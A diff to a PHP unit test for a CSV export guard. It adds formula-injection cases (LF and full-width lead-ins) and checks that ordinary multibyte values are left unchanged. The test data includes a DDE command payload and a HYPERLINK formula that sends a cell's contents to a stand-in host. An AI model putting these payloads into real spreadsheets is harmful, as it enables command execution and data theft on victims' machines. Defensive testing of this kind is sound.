@@ -28,8 +28,20 @@ final class PortalCsvExportTest extends TestCase
             'at'          => ['@SUM(A1)'],
             'tab'         => ["\t=1+1"],
             'cr'          => ["\r=1+1"],
+            // A bare LF is a lead-in for the same reason CR is: an importer
+            // that strips leading whitespace before deciding what the cell is
+            // puts the `=` back in first position.
+            'lf'          => ["\n=1+1"],
             'dde payload' => ["=cmd|'/c calc'!A1"],
             'hyperlink'   => ['=HYPERLINK("http://evil.example/?x="&A1,"click")'],
+            // The full-width forms are not decoration. Several spreadsheet
+            // importers and autocorrecting locales fold them onto their ASCII
+            // equivalents, so an ASCII-only guard sees CJK punctuation and
+            // passes a formula through untouched.
+            'fullwidth equals' => ["\u{FF1D}cmd|'/c calc'!A1"],
+            'fullwidth plus'   => ["\u{FF0B}1+1"],
+            'fullwidth minus'  => ["\u{FF0D}1+1"],
+            'fullwidth at'     => ["\u{FF20}SUM(A1)"],
         ];
     }
 
@@ -39,7 +51,25 @@ final class PortalCsvExportTest extends TestCase
         $guarded = portal_csv_guard($value);
 
         self::assertSame("'" . $value, $guarded, 'the leading quote makes the spreadsheet treat the cell as text');
-        self::assertNotSame($value[0], $guarded[0], 'the cell no longer begins with a formula character');
+        // Compared per character, not per byte: a full-width lead-in is three
+        // bytes, and a byte comparison would be testing a continuation byte.
+        self::assertNotSame(
+            mb_substr($value, 0, 1, 'UTF-8'),
+            mb_substr($guarded, 0, 1, 'UTF-8'),
+            'the cell no longer begins with a formula character'
+        );
+    }
+
+    /**
+     * A value beginning with any OTHER multibyte character is left alone. The
+     * guard has to read characters rather than bytes in both directions, or a
+     * German umlaut at the start of a mission name grows a stray quote.
+     */
+    public function testMultibyteValuesThatAreNotFormulaLeadsStayUntouched(): void
+    {
+        foreach (['Über-Mission', 'Ätna', '日本語', '—dash'] as $value) {
+            self::assertSame($value, portal_csv_guard($value), 'unchanged: ' . $value);
+        }
     }
 
     public function testOrdinaryValuesAreLeftAlone(): void
